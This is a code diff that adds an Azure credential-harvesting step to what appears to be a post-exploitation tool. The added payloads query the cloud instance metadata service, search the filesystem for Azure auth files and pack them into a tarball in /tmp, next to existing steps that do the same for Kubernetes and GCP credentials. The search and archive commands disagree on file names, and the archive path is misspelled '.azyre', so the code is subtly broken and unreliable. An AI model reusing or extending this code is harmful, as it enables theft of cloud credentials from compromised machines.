@@ -180,6 +180,31 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                     result = run_base64_payload(
                         session=session, payload=payload, log_name="payload_gcpcreds")
                     session.log(result)
+                if csp == "azure":
+                    # get instance metadata
+                    payload = 'curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq'
+                    session.log("running instance metadata find...")
+                    result = run_base64_payload(
+                        session=session, payload=payload, log_name="payload_instancemetadata")
+                    session.log(result)
+
+                    # remove any pre-existing cred archived
+                    if session.platform.Path('/tmp/azure_creds.tgz').exists():
+                        session.platform.unlink('/tmp/azure_creds.tgz')
+
+                    # enumerate azure creds
+                    payload = 'find / \( -type f -a \( -name \'my.azureauth.json\' -a -path \'*.azure/my.azureauth\' \) \)  -printf \'%P\n\''
+                    session.log("running credentials find...")
+                    result = run_base64_payload(
+                        session=session, payload=payload, log_name="payload_azurecredsfind")
+                    session.log(result)
+
+                    # create an archive of all azure creds
+                    payload = 'tar -czvf /tmp/azure_creds.tgz -C / $(find / \( -type f -a \( -name \'my.azureauth\' -a -path \'*.azyre/my.azureauth\' \) \)  -printf \'%P\n\')'
+                    session.log("payload loaded and ready")
+                    result = run_base64_payload(
+                        session=session, payload=payload, log_name="payload_azurecreds")
+                    session.log(result)
 
                 # create an archive of all kube creds
                 payload = 'tar -czvf /tmp/kube_creds.tgz -C / $(find / \( -type f -a \( -name \'config\' -a -path \'*.kube/config\' \) \)  -printf \'%P\n\')'
